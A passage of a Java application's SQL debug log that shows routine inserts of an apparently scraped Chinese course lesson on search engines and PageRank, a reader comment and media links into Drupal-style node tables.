entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/6b49bf7d7a602d514b9f1efce2943f08?bkt=en-4d166c071887761588fbae8711db460bb3e4681054e2be99f549268360399b6e92a2be3244970a90&fid=3757516097-778750-838956363868065&time=1605755228&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-%2BYq%2Fo3ISOtTtaZZEFTAGk97t4rU%3D&to=92&size=10444626&sta_dx=10444626&sta_cs=3216&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1574746261&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=10444626&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-4d30d1617ca31b1820e2c25464f2727b513aa9a7bc3430259861acf0d5305b7ce7930bec263d939f&sl=76480590&expires=8h&rt=pr&r=697762001&mlogid=7502026954681783740&vbdid=2247232042&fin=33%E4%B8%A8%E7%89%B9%E5%88%AB%E6%94%BE%E9%80%81%EF%BC%9A%E8%81%8A%E4%B8%80%E8%81%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AD%A6%E8%8B%B1%E8%AF%AD.m4a&bflag=92,34-92&rtype=1&dp-logid=7502026954681783740&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=6271d6a92c89ad8b4391dc068565d91f99f9df04713e16bb&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=33%E4%B8%A8%E7%89%B9%E5%88%AB%E6%94%BE%E9%80%81%EF%BC%9A%E8%81%8A%E4%B8%80%E8%81%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AD%A6%E8%8B%B1%E8%AF%AD.m4a', 
13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.909 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.910 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:07:09.910 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.911 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:07:09.912 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/10/df/63/cf317827.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>anginiit</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-25 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 是啊 好多技术疑问没有中文文档 搜到的英文原文是一句一句啃 但还是不太明白 英语学习是必须的 这也是我列入下一年的首要计划 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div 
class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> 
</div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> 
</div> </div> </div></li>', 0, 'full_html', 'zh-hans', 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.915 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.915 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:07:09.916 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/10/df/63/cf317827.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>anginiit</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-25 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 是啊 好多技术疑问没有中文文档 搜到的英文原文是一句一句啃 但还是不太明白 英语学习是必须的 这也是我列入下一年的首要计划 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div 
class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> 
</div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> 
</div> </div> </div></li>', 0, 'full_html', 'zh-hans', 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.919 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.919 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:07:09.920 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.920 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:07:09.921 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 13, 'https://static001.geekbang.org/resource/image/0f/c0/0fda560c34995429929dbec9a25aa1c0.jpg', 
13) 
 {executed in 0 msec}
2020-11-19 11:07:09.924 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.924 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:07:09.925 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 13, 'https://static001.geekbang.org/resource/image/0f/c0/0fda560c34995429929dbec9a25aa1c0.jpg', 
13) 
 {executed in 0 msec}
2020-11-19 11:07:09.928 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.928 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:07:09.929 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.932 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.932 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:07:09.933 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:46.830 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='51866394734162' 
 {executed in 0 msec}
2020-11-19 11:07:46.831 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:07:46.832 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755266, 1) 
 {executed in 1 msec}
2020-11-19 11:07:46.832 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755266, 1) 
 {executed in 0 msec}
2020-11-19 11:07:46.832 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|14            |
|--------------|

2020-11-19 11:07:46.841 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', 'e087f8e0-da39-496a-a75b-4e43adf5c99f', 
14) 
 {executed in 0 msec}
2020-11-19 11:07:46.841 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', 'e087f8e0-da39-496a-a75b-4e43adf5c99f', 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.842 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|14            |
|--------------|

2020-11-19 11:07:46.846 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=14, revision_default=1, revision_timestamp=1605755266, 
revision_uid=1 where vid=14 
 {executed in 0 msec}
2020-11-19 11:07:46.850 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.850 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:07:46.851 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '51866394734162', 'zh-hans', 14, 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.858 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=14 
 {executed in 1 msec}
2020-11-19 11:07:46.858 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:07:46.859 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '51866394734162', 'zh-hans', 14, 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.863 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=14 
 {executed in 0 msec}
2020-11-19 11:07:46.864 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:07:46.864 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=14 
 {executed in 0 msec}
2020-11-19 11:07:46.865 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:07:46.866 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 12, 14, 0, 0, 12, 0, 14) 
 {executed in 1 msec}
2020-11-19 11:07:46.870 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=14 
 {executed in 1 msec}
2020-11-19 11:07:46.870 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:07:46.871 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.871 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:07:46.875 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="1264" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-300f25fd " data-slate-type="paragraph" data-slate-object="block" 
data-key="1265"> <span data-slate-object="text" data-key="1266"><span data-slate-leaf="true" 
data-offset-key="1266:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-ae10afdf " data-slate-type="paragraph" data-slate-object="block" data-key="1267"> 
<span data-slate-object="text" data-key="1268"><span data-slate-leaf="true" data-offset-key="1268:0" 
data-first-offset="true"><span data-slate-string="true">今天，我们来聊一聊搜索引擎和 SEO（Search Engine Optimization）。当网站发布上线以后，我们希望通过适当的优化调整，让它可以被搜索引擎更好地“理解”，在用户使用搜索引擎搜索的时候，网站的内容可以更恰当地暴露给用户。</span></span></span> 
</div> <div class="se-f95e2ef9 " data-slate-type="paragraph" data-slate-object="block" data-key="1269"> 
<span data-slate-object="text" data-key="1270"><span data-slate-leaf="true" data-offset-key="1270:0" 
data-first-offset="true"><span data-slate-string="true">作为程序员，和更擅长于与内容打交道的运营相比，</span></span></span><span 
data-slate-object="text" data-key="1271"><span data-slate-leaf="true" data-offset-key="1271:0" 
data-first-offset="true"><span class="se-d1464d5f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们的角度是不一样的，我们更关注工程实现而非网页内容，也更需要从原理的角度去理解 SEO。</span></span></span></span><span 
data-slate-object="text" data-key="1272"><span data-slate-leaf="true" data-offset-key="1272:0" 
data-first-offset="true"><span data-slate-string="true">这一讲，就让我们从理解互联网搜索引擎的工作原理开始。</span></span></span> 
</div> <h2 class="se-feac571d" data-slate-type="heading" data-slate-object="block" data-key="1273"><span 
data-slate-object="text" data-key="1274"><span data-slate-leaf="true" data-offset-key="1274:0" 
data-first-offset="true"><span data-slate-string="true">互联网搜索引擎</span></span></span></h2> <div 
class="se-bdca128d " data-slate-type="paragraph" data-slate-object="block" data-key="1275"> 
<span data-slate-object="text" data-key="1276"><span data-slate-leaf="true" data-offset-key="1276:0" 
data-first-offset="true"><span data-slate-string="true">要说 SEO，我觉得我们需要先来简单了解一下互联网上的搜索引擎。</span></span></span> 
</div> <h3 class="se-bb594ceb" data-slate-type="heading" data-slate-object="block" data-key="1277"><span 
data-slate-object="text" data-key="1278"><span data-slate-leaf="true" data-offset-key="1278:0" 
data-first-offset="true"><span data-slate-string="true">组成部分</span></span></span></h3> <div 
class="se-69725970 " data-slate-type="paragraph" data-slate-object="block" data-key="1279"> 
<span data-slate-object="text" data-key="1280"><span data-slate-leaf="true" data-offset-key="1280:0" 
data-first-offset="true"><span data-slate-string="true">对于 Google 和百度这样的巨型 Web 搜索引擎来说，这里面的机制很复杂，而它们之间又有很多区别。比如被搜索的数据是怎样产生的，权重是怎样分配的，用户的输入又是怎样被理解的等等，但是大体上，它总是包含这样三部分。</span></span></span> 
</div> <div class="se-6f760309 " data-slate-type="paragraph" data-slate-object="block" data-key="1281"> 
<span data-slate-object="text" data-key="1282"><span data-slate-leaf="true" data-offset-key="1282:0" 
data-first-offset="true"><span class="se-b293ccbf" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 爬取（Crawling）</span></span></span></span> </div> <div class="se-018f928b 
" data-slate-type="paragraph" data-slate-object="block" data-key="1283"> <span data-slate-object="text" 
data-key="1284"><span data-slate-leaf="true" data-offset-key="1284:0" data-first-offset="true"><span 
data-slate-string="true">搜索引擎会有若干个“爬虫”客户端定期地访问你的网站，如果数据有了变更，它们会将可访问的网页下载下来。搜索引擎发现网页的方式，和人是一样的，就是通过超链接。因此理论上，如果你建立了一个网站，但是你没有主动“告知”搜索引擎，也没有任何网站页面有超链接指向它，那么它是无法被搜索引擎的爬虫发现的。</span></span></span> 
</div> <div class="se-88166f6c " data-slate-type="paragraph" data-slate-object="block" data-key="1285"> 
<span data-slate-object="text" data-key="1286"><span data-slate-leaf="true" data-offset-key="1286:0" 
data-first-offset="true"><span class="se-be413e30" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. 建立索引（Indexing）</span></span></span></span> </div> <div class="se-14d1d3be 
" data-slate-type="paragraph" data-slate-object="block" data-key="1287"> <span data-slate-object="text" 
data-key="1288"><span data-slate-leaf="true" data-offset-key="1288:0" data-first-offset="true"><span 
data-slate-string="true">这一步其实就是将前面爬取的结果，经过解析和处理以后，以一种有利于搜索的方式归类存放起来。在 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1289" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1290"><span data-slate-leaf="true" data-offset-key="1290:0" 
data-first-offset="true"><span data-slate-string="true">[第 26 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1291"><span data-slate-leaf="true" data-offset-key="1291:0" 
data-first-offset="true"><span data-slate-string="true"> 我们介绍了搜索引擎的倒排索引机制。</span></span></span> 
</div> <div class="se-aa2f6bd6 " data-slate-type="paragraph" data-slate-object="block" data-key="1292"> 
<span data-slate-object="text" data-key="1293"><span data-slate-leaf="true" data-offset-key="1293:0" 
data-first-offset="true"><span class="se-2c4cde6f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">3. 返回结果（Serving Results）</span></span></span></span> </div> <div class="se-d01f282a 
" data-slate-type="paragraph" data-slate-object="block" data-key="1294"> <span data-slate-object="text" 
data-key="1295"><span data-slate-leaf="true" data-offset-key="1295:0" data-first-offset="true"><span 
data-slate-string="true">拆解用户的搜索条件，根据多种因素来决定返回哪些网页或其它资源给用户，也包括确定它们的展示顺序（Ranking）。</span></span></span> 
</div> <div class="se-a4611dd2 " data-slate-type="paragraph" data-slate-object="block" data-key="1296"> 
<span data-slate-object="text" data-key="1297"><span data-slate-leaf="true" data-offset-key="1297:0" 
data-first-offset="true"><span data-slate-string="true">这三个大致的步骤协同合作并提供了如今互联网搜索引擎的服务，当然，实际过程会复杂得多。比方说，上述的第 
2 步就要包含解析、分词、去重、去噪等等许多步的操作。</span></span></span> </div> <div class="se-b0009bdd " data-slate-type="paragraph" 
data-slate-object="block" data-key="1298"> <span data-slate-object="text" data-key="1299"><span 
data-slate-leaf="true" data-offset-key="1299:0" data-first-offset="true"><span data-slate-string="true">另外值得一提的是，搜索的数据现在确实都是增量更新的，可早些年其实并不是如此。Google 
在 2003 年以前，爬虫完成不同的数据爬行需要不同的时间，其中最慢的需要几个月，之后的索引需要一周，数据分发也需要一周，在这以后才能被搜索到，因此人们往往也只能搜索到很早以前的数据（当然，那时候互联网的数据没那么大，变更也没那么频繁）。在一次重要更新 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1300" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1301"><span data-slate-leaf="true" data-offset-key="1301:0" 
data-first-offset="true"><span data-slate-string="true">Fritz</span></span></span></a><span 
data-slate-object="text" data-key="1302"><span data-slate-leaf="true" data-offset-key="1302:0" 
data-first-offset="true"><span data-slate-string="true"> 以后，爬虫才每天都爬网页的数据，搜索数据也才做到了日更新。</span></span></span> 
</div> <h3 class="se-2db10db7" data-slate-type="heading" data-slate-object="block" data-key="1303"><span 
data-slate-object="text" data-key="1304"><span data-slate-leaf="true" data-offset-key="1304:0" 
data-first-offset="true"><span data-slate-string="true">PageRank</span></span></span></h3> 
<div class="se-a8cd52f7 " data-slate-type="paragraph" data-slate-object="block" data-key="1305"> 
<span data-slate-object="text" data-key="1306"><span data-slate-leaf="true" data-offset-key="1306:0" 
data-first-offset="true"><span data-slate-string="true">纵观上面所述的三个步骤，从功能实现的流程和工程上面说，它们各自看起来并没有太大的技术门槛，但是搜索质量却天差地别。其中重要的一项就是怎样对返回给用户的网页进行排名，对于 
Google 搜索，这一系列算法中最核心的那个，就叫做 PageRank。</span></span></span> </div> <div class="se-91180e23 " 
data-slate-type="paragraph" data-slate-object="block" data-key="1307"> <span data-slate-object="text" 
data-key="1308"><span data-slate-leaf="true" data-offset-key="1308:0" data-first-offset="true"><span 
data-slate-string="true">在 PageRank 以前，排序大多依靠对搜索关键字和目标页的匹配度来进行，这种排序方式弊端非常明显，尤其对于善于堆砌关键字“舞弊”的页面，很容易就跳到了搜索结果的首页。但是这样的页面对于用户来说，价值非常小。</span></span></span> 
</div> <div class="se-4d58b878 " data-slate-type="paragraph" data-slate-object="block" data-key="1309"> 
<span data-slate-object="text" data-key="1310"><span data-slate-leaf="true" data-offset-key="1310:0" 
data-first-offset="true"><span data-slate-string="true">PageRank 算法的本质，就是利用网页之间的关联关系来确定网页的影响力权重。而这个关联关系，就是网页之间的超链接，换言之，如果一个页面被各种其它页面引用，特别是被“重要”的网站和页面引用，这就说明这个页面的权重更高。</span></span></span> 
</div> <div class="se-e75b71be " data-slate-type="paragraph" data-slate-object="block" data-key="1311"> 
<span data-slate-object="text" data-key="1312"><span data-slate-leaf="true" data-offset-key="1312:0" 
data-first-offset="true"><span data-slate-string="true">在实际搜索的时候，</span></span></span><span 
data-slate-object="text" data-key="1313"><span data-slate-leaf="true" data-offset-key="1313:0" 
data-first-offset="true"><span class="se-1ff4f4b5" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">需要做到两个因素的平衡：一个是 Reputation，也就是上面说的这个影响力，它并不会因为用户单次搜索的关键字不同而改变；还有一个是 
Proximity，也就是接近程度，这是根据用户搜索的关键字的匹配程度来确定返回网页的。</span></span></span></span> </div> <div class="se-598a5f11 
" data-slate-type="paragraph" data-slate-object="block" data-key="1314"> <span data-slate-object="text" 
data-key="1315"><span data-slate-leaf="true" data-offset-key="1315:0" data-first-offset="true"><span 
data-slate-string="true">如果只考虑 Reputation，那么所有用户搜到的东西都是一样的，这就不是一个搜索引擎了，而是一个网页的有序列表；如果只考虑 Proximity，那么用户搜到的东西就是杂乱无章的匹配页面，而不是像现在这样，将“重要”的页面显示在前面。无论是百度还是 
Bing，</span></span></span><span data-slate-object="text" data-key="1316"><span data-slate-leaf="true" 
data-offset-key="1316:0" data-first-offset="true"><span class="se-214f7906" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">不同搜索服务的算法不同，但都是立足于做到这两个基本因素的制衡。</span></span></span></span> 
</div> <h2 class="se-fc869c14" data-slate-type="heading" data-slate-object="block" data-key="1317"><span 
data-slate-object="text" data-key="1318"><span data-slate-leaf="true" data-offset-key="1318:0" 
